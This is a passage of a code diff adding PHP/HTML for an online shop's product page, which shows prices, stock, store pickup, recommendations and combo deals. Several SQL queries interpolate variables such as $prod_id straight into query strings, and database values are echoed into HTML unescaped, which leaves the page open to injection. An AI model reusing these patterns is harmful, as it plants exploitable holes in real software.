+                                                                echo '<span class="blue bold">'.$texto_prod2.'</span>';
+                                                            echo '</div>';
+                                                            echo '<div class="col-12 text-start">';
+                                                                echo '<del class="x-big precio gray">';
+                                                                    echo '<span class="small">$</span>';
+                                                                    echo '<span id="precio">'.number_format($pvp, 2, '.', '').'</span>';
+                                                                echo '</del>';
+                                                                echo '&nbsp;&nbsp;&nbsp; <span class="ribbon-2 bgred" onclick="mensaje(\'agotar_sock\')">-'.number_format((int)((1-($precio/$pvp))*100)).'%</span><br>';
+                                                                echo '<span class="x-big blue precio bold">';
+                                                                    echo '<span class="small blue bold">$</span>';
+                                                                    echo '<span id="precio">'.number_format($precio, 2, '.', '').'</span>';
+                                                                echo '</span>';
+                                                            echo '</div>';
+                                                        echo '</div>';
+
+                                                    }
+                                                } else { // no tiene promociones
+                                                    echo '<div class="row">';
+                                                        echo '<div class="col-12 text-start">';
+                                                            echo '<span class="gray">'.$texto_prod1.'</span>';
+                                                        echo '</div>';
+                                                        echo '<div class="col-12 text-start">';
+                                                            echo '<span id="precio2">$'.number_format((int)$precio*$comision_diferido, 2, '.', '').'</span>';
+                                                        echo '</div>';
+                                                        echo '<div class="col-12"><div id="diferidosContent"></div></div>';
+                                                    echo '</div>';
+
+                                                    echo '<div class="row">';
+                                                        echo '<div class="col-12 text-start"><br>';
+                                                            echo '<span class="blue bold">'.$texto_prod2.'</span>';
+                                                        echo '</div>';
+                                                        echo '<div class="col-12 text-start">';
+                                                            echo '<span class="x-big blue precio bold">';
+                                                                echo '<span class="small blue bold">$</span>';
+                                                                echo '<span id="precio">'.number_format($precio, 2, '.', '').'</span>';
+                                                            echo '</span>';
+                                                        echo '</div>';
+                                                    echo '</div><br/>';
+                                                }
+                                            } else {
+                                                $precio = 0;
+                                            }
+                                        ?>
+                                    </div>
+                                    <div class="col-2">
+                                        <div style="display: inline-grid;" onclick="guardar(<?php echo $prod_id; ?>)">
+                                            <i class="fa fa-2x fa-bookmark iconProducto" style="color:#f6b900;"></i>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <div class="row">
+                                    <div class="col-12"><br>
+                                        <center>
+                                            <?php
+                                                if ($estado == "a") {
+                                                    if ($existencias > 0) {
+                                                        echo '<center>';
+                                                            if ($existencias > 0 && $existencias < 4) {
+                                                                echo '<div class="ribbon-2" style="background-color:#0071FF;" onclick="mensaje(\'ultimos_disponibles\')">Últimas unidades</div>';
+                                                            }
+                                                            
+                                                            $tiene_retiro = false;
+                                                            $stock_b7 = 0;
+                                                            $stock_b14 = 0;
+                                                            $sql_retiro =   "SELECT b.bodega_id, b.bodega_retiro, cant_stock 
+                                                                            FROM productos_stock ps
+                                                                            JOIN bodegas b ON ps.bodega_id = b.bodega_id
+                                                                            WHERE ps.prod_id = '$prod_codigo_referencia'
+                                                                            AND b.bodega_retiro = 1";
+                                                            $res_retiro = mysqli_query($conexion, $sql_retiro);
+                                                            while ($row = mysqli_fetch_assoc($res_retiro)) {
+                                                                if ($row['bodega_id'] == 7) {
+                                                                    $stock_b7 = $row['cant_stock'];
+                                                                } elseif ($row['bodega_id'] == 14) {
+                                                                    $stock_b14 = $row['cant_stock'];
+                                                                } elseif ($row['cant_stock'] >= 3) {
+                                                                    $mostrar_retiro = true; // Otras bodegas con retiro y suficiente stock
+                                                                }
+                                                            }
+                                                            
+                                                            if (($stock_b7 + $stock_b14) >= 3) {
+                                                                $mostrar_retiro = true;
+                                                            }
+                                                            
+                                                            echo '<table style="width:80%; border-bottom: solid 1px #ccc; padding-bottom: 5px;">';
+                                                                echo '<tr>';
+                                                                    echo '<td colspan="2" class="text-start align-text-bottom">';
+                                                                        echo '<label class="align-text-bottom gray"><b>Revisa la disponibilidad</b></label>';
+                                                                    echo '</td>';
+                                                                echo '</tr>';
+                                                            echo '</table>';
+                                                            echo '<table style="width:80%; border-bottom: solid 1px #ccc; padding-bottom: 5px;">';
+                                                                echo '<tr>';
+                                                                    echo '<td style="width:25%;">';
+                                                                        echo '<img src="https://kissu.com.ec/imagenes/iconos/envio_web.png" style="width:60px;" onclick="mensaje(\'disponible\')">';
+                                                                    echo '</td>';
+                                                                    echo '<td style="width:75%; padding-left:5px;">';
+                                                                        echo '<div style="line-height:15px; margin-top:5px; cursor:pointer;">';
+                                                                            echo '<span onclick="mensaje(\'disponible\')"><small style="color:#18a212;">Disponible</small></span><br>';
+                                                                            echo '<span onclick="mensaje(\'disponible\')">Envío a domicilio</span><br>';
+                                                                            //echo '<span style="font-size:smaller; color:#6385e8;" onclick="mensaje(\'disponible\')">Ver costo</span>';
+                                                                        echo '</div>';
+                                                                    echo '</td>';
+                                                                echo '</tr>';
+                                                            echo '</table>';
+                                                            
+                                                            if ($mostrar_retiro == 1) {
+                                                                echo '<table style="width:80%;">';
+                                                                    echo '<tr>';
+                                                                        echo '<td style="width:25%;">';
+                                                                            echo '<img src="https://kissu.com.ec/imagenes/iconos/tienda_web.png" style="width:60px;" onclick="retiro('.$prod_codigo_referencia.')">';
+                                                                        echo '</td>';
+                                                                        echo '<td style="width:75%; padding-left:5px;">';
+                                                                            echo '<div style="line-height:15px; margin-top:5px; cursor:pointer;">';
+                                                                                echo '<span onclick="retiro('.$prod_codigo_referencia.')"><small style="color:#18a212;">Disponible</small></span><br>';
+                                                                                echo '<span onclick="retiro('.$prod_codigo_referencia.')">Retiro en tienda</span><br>';
+                                                                                echo '<span style="font-size:smaller; color:#6385e8;" onclick="retiro('.$prod_codigo_referencia.')">Hoy mismo - Ver más</span><br>';
+                                                                                echo '<div style="font-size:0.8em; color:#000; font-weight:bold; background-color:#f5f8ff; padding:10px; border-radius:5px; display:none;" id="direccionesTienda"></div>';
+                                                                            echo '</div>';
+                                                                        echo '</td>';
+                                                                    echo '</tr>';
+                                                                echo '</table><br>';
+                                                            }
+                                                        echo '</center>';
+
+                                                        if ($existencias > 2) {
+                                                            echo '<div class="row">';
+                                                                echo '<div class="col-4"></div>';
+                                                                echo '<div class="col-4 align-text-bottom">';
+                                                                    echo '<center>';
+                                                                        echo '<label for="cantidad" class="align-text-bottom gray">Cantidad</label>';
+                                                                        echo '<input type="number" class="form-control" id="cantidad" name="cantidad" value="1" min="1" step="1" onchange="cambiaCant()" />';
+                                                                    echo '</center>';
+                                                                echo '</div>';
+                                                            echo '</div>';
+                                                        }
+                                                    } else {
+                                                        $query_etiquetas = mysqli_query($conexion, "SELECT b.etiqueta_id FROM etiquetas_productos a JOIN etiquetas b ON a.id_etiqueta = b.etiqueta_id WHERE b.etiqueta_id = '12' AND b.etiqueta_estado = 'a' AND a.id_prod = '$prod_id';");
+                                                        if ($row_etiquetas = mysqli_fetch_array($query_etiquetas)) {
+                                                            echo '<div class="ribbon-2" style="background-color:#ff5c01; color:#fff;" onclick="mensaje(\'bajo_pedido\')">24 a 72 horas</div>';
+                                                        } else {
+                                                            echo '<div class="ribbon-2" style="background-color:#F7172A; color:#fff;" onclick="mensaje(\'agotado\')">Agotado</div>';
+                                                        }
+                                                    }
+
+                                                    $query_etiquetas = mysqli_query($conexion, "SELECT b.etiqueta_icono, b.etiqueta_posicion FROM etiquetas_productos a JOIN etiquetas b ON a.id_etiqueta = b.etiqueta_id WHERE b.etiqueta_tipo = '1' AND b.etiqueta_id <> 12 AND b.etiqueta_estado = 'a' AND a.id_prod = '$prod_id';");
+                                                    while ($row_etiquetas = mysqli_fetch_array($query_etiquetas)) {
+                                                        echo '<span style="padding:5px;"><img class="etiqueta-icono" src="'.$image_path.'/iconos/'.$row_etiquetas["etiqueta_icono"].'"></span>';
+                                                    }
+
+                                                    echo '<div class="row">';
+                                                        if ($existencias > 2) {
+                                                            echo '<div class="col-12"><br>';
+                                                                echo '<center>';
+                                                                    echo '<a href="#" onclick="comprar('.$prod_id.')" style="padding:5px; width:85%;font-weight:bold;" class="btn btn-sm btn-primary medium mb-2">Agregar al carrito</a>';
+                                                                echo '</center>';
+                                                            echo '</div>';
+                                                        }
+
+                                                        echo '<div class="col-12">';
+                                                            echo '<center>';
+                                                                echo '<a href="compra_whatsapp.php?producto='.$prod_id.'&ver='.$identidad.' '.$marca.' '.$prod_modelo.'" target="_blank" style="padding:5px; width:85%;font-weight:bold;" class="btn btn-sm btn-wa medium">Compra por WhatsApp</a>';
+                                                            echo '</center>';
+                                                        echo '</div>';
+                                                    echo '</div>';
+
+                                                } else {
+                                                    echo '<div class="row">';
+                                                        echo '<div class="col-12"><br>';
+                                                            echo '<center>';
+                                                                echo '<div class="ribbon-2" style="background-color:red">No disponible al momento</div>';
+                                                                echo '<br><a href="https://www.kissu.com.ec/filtros.php?t=prod&p='.$id_articulos.'"><div class="btn btn-block btn-primary">Ver nuevos modelos de<br><b>'.strtolower($nombre_particular).'</b></div></a>';
+                                                            echo '</center>';
+                                                        echo '</div>';
+                                                    echo '</div>';
+
+                                                    echo '<div class="row">';
+                                                        echo '<div class="col-12"><br>';
+                                                            echo '<center>';
+                                                                echo '<a href="compra_whatsapp.php?producto='.$prod_id.'&ver='.$identidad.' '.$marca.' '.$prod_modelo.'" target="_blank" style="padding:5px; width:85%;font-weight:bold;" class="btn btn-sm btn-wa medium">Pregúntame por otro modelo</a><br><br><br>';
+                                                            echo '</center>';
+                                                        echo '</div>';
+                                                    echo '</div>';
+                                                }
+                                            ?>
+                                        </center>
+                                    </div>   
+                                    <?php
+                                        $sql_recomendados = 
+                                            "SELECT DISTINCT prod_rec.prod_id, d_hijo.marca_nombre, prod_rec.prod_modelo, prod_rec.prod_nombre, color_hijo.color_nombre, prod_rec.prod_codigo_referencia, ident_hijo.identidad_nombre AS identidad, pm_hijo.multi_imagen AS imagen, SUM(st_hijo.cant_stock) AS existencias, prod_rec.prod_estado, prod_rec.prod_visible, prod_rec.prod_codigo_fabrica,
+                                            CASE 
+                                            WHEN pr_hijo.promo_reloj IS NOT NULL AND (pr_hijo.promo_reloj = 0 OR (pr_hijo.promo_reloj = 1 AND pr_hijo.promo_hasta > CURRENT_DATE())) 
+                                            THEN pr_hijo.promo_precio
+                                            ELSE pp_hijo.precio_valor
+                                            END AS precio
+                                            FROM productos padre
+                                            JOIN recomendaciones rec ON padre.prod_id = rec.recomendacion_padre
+                                            JOIN productos prod_rec ON rec.recomendacion_hijo = prod_rec.prod_id
+                                            JOIN productos_marcas d_hijo ON prod_rec.id_marca = d_hijo.marca_id
+                                            JOIN productos_colores color_hijo ON prod_rec.id_color = color_hijo.color_id
+                                            JOIN productos_identidades ident_hijo ON ident_hijo.identidad_id = prod_rec.id_identidad
+                                            LEFT JOIN productos_stock st_hijo ON st_hijo.prod_id = prod_rec.prod_codigo_referencia
+                                            LEFT JOIN (SELECT id_prod, MAX(precio_id) AS max_precio_id, precio_valor FROM productos_precios WHERE id_canal = 1 GROUP BY id_prod) pp_hijo ON prod_rec.prod_id = pp_hijo.id_prod
+                                            LEFT JOIN (SELECT id_prod, MAX(promo_id) AS max_promo_id, promo_precio, promo_reloj, promo_hasta FROM productos_promociones GROUP BY id_prod) pr_hijo ON prod_rec.prod_id = pr_hijo.id_prod
+                                            LEFT JOIN (SELECT mm.id_prod, mm.multi_imagen, mm.multi_tipo FROM productos_multimedia mm INNER JOIN (SELECT id_prod, MIN(multi_posicion) as min_posicion FROM productos_multimedia WHERE multi_estado = 'a' AND multi_tipo = 'imagen'GROUP BY id_prod) sub_mm ON mm.id_prod = sub_mm.id_prod AND mm.multi_posicion = sub_mm.min_posicion) pm_hijo ON prod_rec.prod_id = pm_hijo.id_prod
+                                            WHERE prod_rec.prod_estado <> 'i'
+                                            AND prod_rec.prod_visible = 'a'
+                                            AND padre.prod_id = '$prod_id'
+                                            GROUP BY prod_rec.prod_id;";
+                                        $query = mysqli_query($conexion, $sql_recomendados);
+                                        if (mysqli_num_rows($query) > 0) {
+                                            echo '<div class="col-12" style="overflow-x:clip;">';
+                                                echo '<br><table>';
+                                                    echo '<tr>';
+                                                        echo '<td>';
+                                                            echo '<p><b>Haz clic y lleva también</b></p>';
+                                                        echo '</td>';
+                                                        echo '<td>&nbsp;</td>';
+                                                        echo '<td style="padding:0 5px; vertical-align: baseline;">';
+                                                            echo '<span onclick="arrowToLeft()"><i id="recomendadoArrow" class="fa fa-chevron-left"></i></span>';
+                                                        echo '</td>';
+                                                        echo '<td style="padding:0 5px; vertical-align: baseline;">';
+                                                            echo '<span onclick="arrowToRight()"><i id="recomendadoArrow" class="fa fa-chevron-right"></i></span>';
+                                                        echo '</td>';
+                                                    echo '</tr>';
+                                                echo '</table>';
+
+                                                echo '<div class="row flex-row flex-nowrap" id="carouselWrapper" style="width:100%;">';
+                                                    while ($row = mysqli_fetch_array($query)) {
+                                                        if ($row['existencias'] > 1) {
+                                                            $prod_id_recomendado = $row['prod_id'];
+                                                            $nombre = '';
+                                                            if ($row['marca_nombre'] == "NO APLICA") { $marca_nombre = ""; }
+                                                            else { $marca_nombre = $row['marca_nombre']; }
+                                                            if ($row['color_nombre'] == "NO APLICA") { $nombre = ucfirst(strtolower($row['identidad'])).' '.ucfirst(strtolower($marca_nombre)).' '.strtoupper($row['prod_modelo']).' '.strtolower($row['prod_nombre']).' '.strtolower($row['prod_caracteristica_especial']).' color '.strtolower($row['color_nombre']); }
+                                                            else { $nombre = ucfirst(strtolower($row['identidad'])).' '.ucfirst(strtolower($marca_nombre)).' '.strtoupper($row['prod_modelo']).' '.strtolower($row['prod_nombre']).' '.strtolower($row['prod_caracteristica_especial']); }
+                                                            $nombre = str_replace('NO APLICA', '', $nombre);
+                                                            if (mb_strlen($nombre) > 18) { $nombre = mb_substr($nombre, 0, 17) . '...'; }
+
+                                                            echo '<div class="text-start" style="margin:0 2px 10px 2px !important; padding: 8px; border-radius: 10px; border: 1px solid #dfe7ea; position: relative; width:150px;">';
+                                                                echo '<center><img onclick="ver_detalle('.$prod_id_recomendado.')" src="https://www.kissu.com.ec/imagenes/productos/sm/'.$row['imagen'].'" style="width:75%;"></center>';
+                                                                echo '<div onclick="ver_detalle('.$prod_id_recomendado.')" class="blue bold" style="font-size:smaller; line-height:15px !important;">'.$nombre.'</div>';
+                                                                echo '<div onclick="ver_detalle('.$prod_id_recomendado.')" class="blue bold medium" style="line-height:35px !important;">$'.number_format((float) $row['precio'], 2, '.', '').'</div>';
+                                                                echo '<div onclick="comprar('.$prod_id_recomendado.')" style="padding:5px; margin:2px; width:95%; font-weight:bold; font-size:smaller;" class="btn btn-sm btn-primary">Agregar</div>';
+                                                            echo '</div>';
+                                                        }
+                                                    }
+                                                    echo '<div class="col-6"></div>';
+                                                echo '</div>';
+                                            echo '</div>';
+                                        }
+                                    ?>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div><br/>
+
+<?php
+    $sql_combos = "SELECT DISTINCT id_combo FROM combos_productos a JOIN combos b ON a.id_combo = b.combo_id WHERE a.id_prod = '$prod_id' AND b.combo_estado = 'a' AND a.cp_posicion = '1';";
+    $query_combo = mysqli_query($conexion, $sql_combos);
+    $total_combos = mysqli_num_rows($query_combo);
+    
+    if ($total_combos > 0) {
+?>
+    <div class="row">
+        <div class="col-12 col-md-1"></div>
+        <div class="col-12 col-md-8">
+            <div class="row">
+               <?php
+                    $precio_normal = 0;
+                    if ($total_combos == 1) {
+                        echo '<div class="container-fluid">';
+                            echo '<div class="row">';
+                                echo '<div class="col-12"><br>';                                
+                                    $sql2 = "SELECT DISTINCT b.combo_id, b.combo_precio, b.combo_nombre FROM combos_productos a JOIN combos b ON a.id_combo = b.combo_id WHERE a.id_prod = '$prod_id' AND b.combo_estado = 'a' AND a.cp_posicion = '1' LIMIT 1;";
+                                    $query = mysqli_query($conexion, $sql2);
+                                    if ($row = mysqli_fetch_array($query)) {
+                                        $combo_id = $row['combo_id'];
+                                        $combo_precio = $row['combo_precio'];
+                                        $combo_nombre = $row['combo_nombre'];
+                                    }
+                                    
+                                    $sql2 = "SELECT DISTINCT a.id_prod FROM combos_productos a WHERE a.id_combo = '$combo_id';";
+                                    $query = mysqli_query($conexion, $sql2);
+                                    $total_productos = mysqli_num_rows($query); 
+                                
+                                    echo '<div style="text-align:center; background-color:#5823c6; padding:3px; color:#fff; border-radius:25px 25px 0 0; margin-top:10px; font-weight:bold;">Mejor en combo</div>';
+                                        echo '<table>';
+                                            echo '<tr>';
+                                                echo '<td colspan="4">';
+                                                    echo '<span class="big p-2" style="font-weight:bold; color:#5823c6">COMBO '.$combo_nombre.'</span>';
+                                                echo '</td>';
+                                            echo '</tr>';
+                                            echo '<tr>';
+                                                $query = mysqli_query($conexion,
+                                                    "SELECT DISTINCT a.prod_id, a.prod_codigo_referencia, a.prod_modelo, a.prod_nombre, a.prod_caracteristica_especial, d.marca_nombre, g.color_nombre, h.identidad_nombre AS identidad, cp_cantidad,
+                                                        (SELECT multi_imagen FROM productos_multimedia WHERE id_prod = a.prod_id AND multi_estado = 'a' AND multi_tipo = 'imagen' ORDER BY multi_posicion ASC LIMIT 1) AS imagen,
+                                                        CASE 
+                                                         WHEN pr.promo_reloj IS NOT NULL AND (pr.promo_reloj = 0 OR (pr.promo_reloj = 1 AND pr.promo_hasta > CURRENT_DATE())) THEN pr.promo_precio
+                                                         ELSE pp.precio_valor
+                                                        END AS precio2
+                                                    FROM productos a
+                                                    JOIN productos_articulos c ON a.id_art = c.art_id
+                                                    JOIN productos_marcas d ON a.id_marca = d.marca_id
+                                                    JOIN productos_colores g ON a.id_color = g.color_id
+                                                    JOIN productos_identidades h ON h.identidad_id = a.id_identidad
+                                                    JOIN combos_productos cp ON cp.id_prod = a.prod_id
+                                                    LEFT JOIN (SELECT id_prod, MAX(precio_id) as max_precio_id, precio_valor FROM productos_precios WHERE id_canal = 1 GROUP BY id_prod) pp ON a.prod_id = pp.id_prod
+                                                    LEFT JOIN (SELECT id_prod, MAX(promo_id) as max_promo_id, promo_precio, promo_reloj, promo_hasta FROM productos_promociones GROUP BY id_prod) pr ON a.prod_id = pr.id_prod
+                                                    WHERE cp.id_combo = '$combo_id'
+                                                    ORDER BY cp.cp_id ASC;");
+                                                while ($row = mysqli_fetch_array($query)) {
+                                                    $productos_combo_cont++;
+                                                    echo '<td style="width:200px;">';
+                                                        echo '<div class="row">';
+                                                            echo '<div class="col-12 text-center">';
+                                                                echo '<a href="combo.php?n='.$combo_id.'" target="_blank">';
+                                                                    if ($row['cp_cantidad'] > 1) { $etiqueta_cantidad = '<div style="position:absolute; background-color:#5823c6; color:#fff; margin:5px; padding:0 8px; border-radius:6px 0 0 6px;"><span style="padding-right:5px; font-weight:bold; border-right:solid 1px #fff;">'.$row['cp_cantidad'].'</span><span style="padding-left:5px;">'.$row['identidad'].'</span></div>'; }
+                                                                    else { $etiqueta_cantidad = ''; }
+                                                                    echo $etiqueta_cantidad;
+                                                                    echo '<img src="'.$image_path.'/productos/sm/'.$row['imagen'].'" alt="" style="width:100%; padding-top:5px; padding-bottom:5px;" />';
+                                                                echo '</a>';
+                                                            echo '</div>';
+                                                        echo '</div>';
+                                                    
+                                                        echo '<div class="row">';
+                                                            echo '<div class="col-12 text-left">';
+                                                                echo '<span class="uppercase small" style="line-height:1px; white-space:pre-line; ">'.str_replace("NO APLICA","",$row['marca_nombre'].' '.$row['prod_modelo']).'</span>';
+                                                                echo '<a href="combo.php?n='.$combo_id.'" target="_blank">';
+                                                                    echo '<div class="medium blue precio">';
+                                                                        if ($row['color_nombre'] == "NO APLICA") { $nombre = strtoupper($row['identidad'].' '.$row['prod_nombre'].' '.$row['prod_caracteristica_especial'].' '.$row['color_nombre']); }
+                                                                        else { $nombre = strtoupper($row['identidad'].' '.$row['prod_nombre'].' '.$row['prod_caracteristica_especial'].' COLOR '.$row['color_nombre']); }                    
+                                                                        $nombre = str_replace('NO APLICA', '', $nombre);
+                                                                        echo ucfirst(strtolower($nombre));
+                                                                    echo '</div>';
+                                                                echo '</a>';
+                                                                echo '<small class="small gray">Cod. F '.$row['prod_codigo_referencia'].' - W '.$row['prod_id'].'</small><br>';
+                                                                if ($row['cp_cantidad'] > 1) { $cu = 'c/u'; }
+                                                                else { $cu = ''; }
+                                                                echo '<span class="gray">Precio normal</span><br>';
+                                                                echo '<span class="gray">$'.number_format((float) $row['precio2'], 2, '.', '').' '.$cu.'</span>';
+                                                                $precio_normal += ($row['precio2']*$row['cp_cantidad']);
+                                                            echo '</div>';
+                                                        echo '</div>';                                        
+                                                    echo '</td>';
+                                                    if ($productos_combo_cont < $total_productos) {
+                                                        echo '<td style="width:45px;"><big><b>+</b></big></td>';
+                                                    }
+                                                }
+                                                $productos_combo_cont = 0;
+                                                echo '<td style="width:10px; border-right:solid 1px #ced4da;"></td>';
+                                                echo '<td style="width:10px;"></td>';
+                                                
+                                                echo '<td style="width:200px;">';
+                                                    echo '<div class="row g-0 align-items-center">';
+                                                        echo '<div class="col-12">';
+                                                            echo '<span class="gray x-big"><del>$'.number_format((float) ($precio_normal), 2, '.', '').'</del>&nbsp;&nbsp;&nbsp; <span class="ribbon-2 bgred" onclick="mensaje(\'agotar_sock\')">-$'.number_format((float)($precio_normal-$combo_precio), 2, '.', '').'</span></span><br>'; 
+                                                        echo '</div>';
+                                                    echo '</div>';
+                                                    echo '<br><span class="blue bold">Precio en combo<br>Descuento en efectivo</span><br>';
+                                                    echo '<span class="x-big blue precio bold"><span class="small blue bold">$</span>'.number_format((float)$combo_precio, 2, '.', '').'</span><br/><br/>';
+                                                    echo '<a href="#" onclick="comprar_combo('.$combo_id.')" style="padding:12px; width:100%; font-weight:bold;" class="btn btn-sm btn-primary mb-3">Agregar al carrito</a>';
+                                                    echo '<a href="https://api.whatsapp.com/send/?phone=593984636271&text=NWS1-Hola, quisiera comprar el combo '.strtoupper(str_replace("+", "-", $combo_nombre)).' de $'.number_format((float)$combo_precio, 2, '.', '').'&app_absent=0" target="_blank" style="padding:5px; font-weight:bold; font-size:small;" class="btn btn-sm btn-wa">Compra por WhatsApp</a>';
+                                                    echo '<div><br><span class="ribbon-2" style="background-color:#5823c6; color:#fff;" onclick="mensaje(\'combo\')">Combo</span>&nbsp;&nbsp;<span class="gray small">Cb. '.$combo_id.'</span></div>';
+                                                echo '</td>';
+                                            echo '</tr>';
+                                        echo '</table>';
+                                    echo '</div>';
+                                    
+                                echo '</div>';
+                            echo '</div>';
+                        echo '</div>';
+                    } else if ($total_combos > 1) {
+                        $combo_cont2 = 0;
+                        echo '<div class="container-fluid">';
+                            echo '<div class="row">';
+                                echo '<div class="col-12"><br>';
+                                    echo '<div style="text-align:center; background-color:#5823c6; padding:3px; color:#fff; border-radius:25px 25px 0 0; margin-top:10px; font-weight:bold;">Mejor en combo</div>';
+                                    echo '<div id="mainCarousel" class="carousel slide" data-ride="carousel" data-pause="hover" data-bs-ride="carousel">';
+                                        echo '<div class="carousel-inner">';
+                                            $query = mysqli_query($conexion, "SELECT DISTINCT b.combo_id, b.combo_precio, b.combo_nombre FROM combos_productos a JOIN combos b ON a.id_combo = b.combo_id WHERE a.id_prod = '$prod_id' AND b.combo_estado = 'a' AND a.cp_posicion = '1';");
+                                            while ($row = mysqli_fetch_array($query)) {
+                                                $combo_cont2++;
+                                                $combo_id = $row['combo_id'];
+                                                $combo_precio = $row['combo_precio'];
+                                                $combo_nombre = $row['combo_nombre'];
+                                                
+                                                $query_total_detalle = mysqli_query($conexion, "SELECT a.id_prod FROM combos_productos a  WHERE a.id_combo = '$combo_id';");
+                                                $total_productos = mysqli_num_rows($query_total_detalle);
+                                                
+                                                if ($combo_cont2 == 1) { $active = 'active'; }
+                                                else { $active = ''; }
+
+                                                echo '<div class="carousel-item '.$active.'">';
+                                                    echo '<div class="row">';        
+                                                        echo '<div>';
+                                                            echo '<table>';
+                                                                echo '<tr>';
+                                                                    echo '<td colspan="'.($total_productos+2).'">';
+                                                                        echo '<span class="big p-2" style="font-weight:bold; color:#5823c6">COMBO '.$combo_nombre.'</span>';
+                                                                    echo '</td>';
+                                                                echo '</tr>';
+                                                                echo '<tr>';
+                                                                    echo '<td style="width:30px;"></td>';
+                                                                    $query_productos_combos = mysqli_query($conexion,
+                                                                        "SELECT DISTINCT a.prod_id, a.prod_codigo_referencia, a.prod_modelo, a.prod_nombre, a.prod_caracteristica_especial, d.marca_nombre, g.color_nombre, h.identidad_nombre AS identidad, cp_cantidad,
+                                                                            (SELECT multi_imagen FROM productos_multimedia WHERE id_prod = a.prod_id AND multi_estado = 'a' AND multi_tipo = 'imagen' ORDER BY multi_posicion ASC LIMIT 1) AS imagen,
+                                                                            CASE 
+                                                                             WHEN pr.promo_reloj IS NOT NULL AND (pr.promo_reloj = 0 OR (pr.promo_reloj = 1 AND pr.promo_hasta > CURRENT_DATE())) THEN pr.promo_precio
+                                                                             ELSE pp.precio_valor
+                                                                            END AS precio2
+                                                                        FROM productos a
+                                                                        JOIN productos_articulos c ON a.id_art = c.art_id
+                                                                        JOIN productos_marcas d ON a.id_marca = d.marca_id
+                                                                        JOIN productos_colores g ON a.id_color = g.color_id
+                                                                        JOIN productos_identidades h ON h.identidad_id = a.id_identidad
+                                                                        JOIN combos_productos cp ON cp.id_prod = a.prod_id
+                                                                        LEFT JOIN (SELECT id_prod, MAX(precio_id) as max_precio_id, precio_valor FROM productos_precios WHERE id_canal = 1 GROUP BY id_prod) pp ON a.prod_id = pp.id_prod
+                                                                        LEFT JOIN (SELECT id_prod, MAX(promo_id) as max_promo_id, promo_precio, promo_reloj, promo_hasta FROM productos_promociones GROUP BY id_prod) pr ON a.prod_id = pr.id_prod
+                                                                        WHERE cp.id_combo = '$combo_id'
+                                                                        ORDER BY cp.cp_id ASC;");
+                                                                    while ($row_productos_combos = mysqli_fetch_array($query_productos_combos)) {
+                                                                        $productos_combo_cont++;
+                                                                        echo '<td style="width:200px;">';
+                                                                            echo '<div class="row">';
+                                                                                echo '<div class="col-12 text-center">';
+                                                                                    echo '<a href="combo.php?n='.$combo_id.'" target="_blank">';
+                                                                                        if ($row_productos_combos['cp_cantidad'] > 1) { $etiqueta_cantidad = '<div style="position:absolute; background-color:#5823c6; color:#fff; margin:5px; padding:0 8px; border-radius:6px 0 0 6px;"><span style="padding-right:5px; font-weight:bold; border-right:solid 1px #fff;">'.$row_productos_combos['cp_cantidad'].'</span><span style="padding-left:5px;">'.$row_productos_combos['identidad'].'</span></div>'; }
+                                                                                        else { $etiqueta_cantidad = ''; }
+                                                                                        echo $etiqueta_cantidad;
+                                                                                        echo '<img src="'.$image_path.'/productos/sm/'.$row_productos_combos['imagen'].'" alt="" style="width:100%; padding-top:5px; padding-bottom:5px;" />';
+                                                                                    echo '</a>';
+                                                                                echo '</div>';
+                                                                            echo '</div>';
+                                                                        
+                                                                            echo '<div class="row">';
+                                                                                echo '<div class="col-12 text-left">';
+                                                                                    echo '<span class="uppercase small" style="line-height:1px; white-space:pre-line; ">'.str_replace("NO APLICA","",$row_productos_combos['marca_nombre'].' '.$row_productos_combos['prod_modelo']).'</span>';
+                                                                                    echo '<a href="combo.php?n='.$combo_id.'" target="_blank">';
+                                                                                        echo '<div class="medium blue precio">';
+                                                                                            if ($row_productos_combos['color_nombre'] == "NO APLICA") { $nombre = strtoupper($row_productos_combos['identidad'].' '.$row_productos_combos['prod_nombre'].' '.$row_productos_combos['prod_caracteristica_especial'].' '.$row_productos_combos['color_nombre']); }
+                                                                                            else { $nombre = strtoupper($row_productos_combos['identidad'].' '.$row_productos_combos['prod_nombre'].' '.$row_productos_combos['prod_caracteristica_especial'].' COLOR '.$row_productos_combos['color_nombre']); }                    
+                                                                                            $nombre = str_replace('NO APLICA', '', $nombre);
+                                                                                            echo ucfirst(strtolower($nombre));
+                                                                                        echo '</div>';
+                                                                                    echo '</a>';
+                                                                                    echo '<small class="small gray">Cod. F '.$row_productos_combos['prod_codigo_referencia'].' - W '.$row_productos_combos['prod_id'].'</small><br>';
+                                                                                    if ($row_productos_combos['cp_cantidad'] > 1) { $cu = 'c/u'; }
+                                                                                    else { $cu = ''; }
+                                                                                    echo '<span class="gray">Precio normal</span><br>';
+                                                                                    echo '<span class="gray">$'.number_format((float) $row_productos_combos['precio2'], 2, '.', '').' '.$cu.'</span>';
+                                                                                    $precio_normal += ($row_productos_combos['precio2']*$row_productos_combos['cp_cantidad']);
+                                                                                echo '</div>';
+                                                                            echo '</div>';                                         
+                                                                        echo '</td>';
+                                                                        
+                                                                        if ($productos_combo_cont < $total_productos) {
+                                                                            echo '<td style="width:45px;"><big><b>+</b></big></td>';
+                                                                        }
+                                                                    }
+                                                                    $productos_combo_cont = 0;
+                                                                    echo '<td style="width:10px; border-right:solid 1px #ced4da;"></td>';
+                                                                    echo '<td style="width:10px;"></td>';
+                                                                    
+                                                                    echo '<td style="width:200px;">';
+                                                                        echo '<div class="row g-0 align-items-center">';
+                                                                            echo '<div class="col-12">';
+                                                                                echo '<span class="gray"><del>$'.number_format((float) ($precio_normal), 2, '.', '').'</del>&nbsp;&nbsp;&nbsp; <span class="ribbon-2 bgred" onclick="mensaje(\'agotar_sock\')">-$'.number_format((float)($precio_normal-$combo_precio), 2, '.', '').'</span></span><br>'; 
+                                                                            echo '</div>';
+                                                                        echo '</div>';
+                                                                        echo '<br><span class="blue bold">Precio en combo<br>Descuento en efectivo</span><br>';
+                                                                        echo '<span class="x-big blue precio bold"><span class="small blue bold">$</span>'.number_format((float)$combo_precio, 2, '.', '').'</span><br/><br/>';
+                                                                        echo '<a href="https://api.whatsapp.com/send/?phone=593984636271&text=NWS1-Hola, quisiera comprar el combo '.strtoupper(str_replace("+", "-", $combo_nombre)).' de $'.number_format((float)$combo_precio, 2, '.', '').'&app_absent=0" target="_blank" style="padding:5px; font-weight:bold; font-size:small;" class="btn btn-sm btn-wa">Compra por whatsapp</a>';
